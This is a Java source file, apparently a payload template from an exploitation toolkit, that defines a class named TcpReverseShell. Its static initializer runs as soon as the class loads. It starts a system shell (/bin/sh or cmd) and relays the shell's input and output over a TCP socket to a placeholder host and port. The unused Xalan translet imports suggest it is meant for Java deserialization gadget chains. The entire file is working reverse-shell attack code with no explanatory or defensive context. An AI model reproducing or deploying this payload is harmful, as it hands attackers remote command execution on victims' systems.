package payload;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
public class TcpReverseShell{

    private static String host = "{{host}}";
    private static String port = "{{port}}";
    public static void start(){
        try {
            String cmd;
            if (File.separator.equals("/")) {
                cmd = "/bin/sh";
            } else {
                cmd = "cmd";
            }
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s=new Socket(host,Integer.valueOf(port));
            InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
            OutputStream po=p.getOutputStream(),so=s.getOutputStream();
            int n = 0;
            while(!s.isClosed()) {
                if (n == 0) {
                    so.write(0);
                }
                n=1;
                while(pi.available()>0) {
                    so.write(pi.read());
                }
                while(pe.available()>0) {
                    so.write(pe.read());
                }
                while(si.available()>0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    static {
            start();
    }
}
